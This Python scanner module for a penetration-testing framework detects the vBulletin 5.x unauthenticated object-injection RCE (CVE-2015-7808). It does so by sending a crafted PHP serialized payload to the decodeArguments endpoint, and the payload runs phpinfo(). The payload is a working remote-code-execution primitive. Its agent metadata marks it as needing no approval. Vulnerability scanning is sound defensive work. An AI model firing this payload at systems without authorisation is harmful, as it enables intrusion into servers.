#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vBulletin 5.x pre-auth object injection RCE (CVE-2015-7808)."""

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vBulletin - decodeArguments RCE Detection (CVE-2015-7808)',
        'description': (
            'Detects CVE-2015-7808 by sending a crafted serialized payload to '
            '/ajax/api/hook/decodeArguments that triggers phpinfo().'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'vbulletin', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-7808',
        ],
        'cve': 'CVE-2015-7808',
    }

    def run(self):
        cmd = 'phpinfo'
        for db in ('vB_Database_MySQLi', 'vB_Database'):
            exp = (
                f'O:12:"vB_dB_Result":2:{{s:5:"\x00*\x00db";O:{len(db)}:"{db}":1:{{'
                f's:9:"functions";a:1:{{s:11:"free_result";s:{len(cmd)}:"{cmd}";}}}}'
                f's:12:"\x00*\x00recordset";i:1;}}'
            )
            # urlencode then replace * markers like NASL
            encoded = quote(exp, safe='')
            # NASL replaces * with %00%2a%00 - our payload already has nulls via \x00
            path = f'/ajax/api/hook/decodeArguments?arguments={encoded}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and '<title>phpinfo()</title>' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='vBulletin decodeArguments RCE (CVE-2015-7808)',
                    path='/ajax/api/hook/decodeArguments',
                )
                return True
        return False
